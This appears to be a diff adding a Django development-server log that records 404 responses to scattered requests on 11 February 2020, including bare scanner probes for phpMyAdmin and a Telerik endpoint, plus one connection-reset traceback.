+[11/Feb/2020 06:47:44] "GET / HTTP/1.1" 404 2028
+Not Found: /Telerik.Web.UI.WebResource.axd
+[11/Feb/2020 07:47:43] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 2144
+Not Found: /
+[11/Feb/2020 08:41:18] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[11/Feb/2020 12:48:11] "GET / HTTP/1.0" 404 2028
+Not Found: /phpmyadmin/
+[11/Feb/2020 13:02:25] "GET /phpmyadmin/ HTTP/1.1" 404 2078
+----------------------------------------
+Exception happened during processing of request from ('85.168.60.210', 53131)
+Traceback (most recent call last):
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 639, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 361, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/root/anaconda3/lib/python3.6/socketserver.py", line 696, in __init__
+    self.handle()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/anaconda3/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/root/anaconda3/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /
+[11/Feb/2020 16:40:28] "GET / HTTP/1.1" 404 2030
+Not Found: /
+[11/Feb/2020 17:21:15] "GET / HTTP/1.1" 404 2028
+Not Found: /
+[11/Feb/2020 18:24:53] "GET / HTTP/1.1" 404 2030
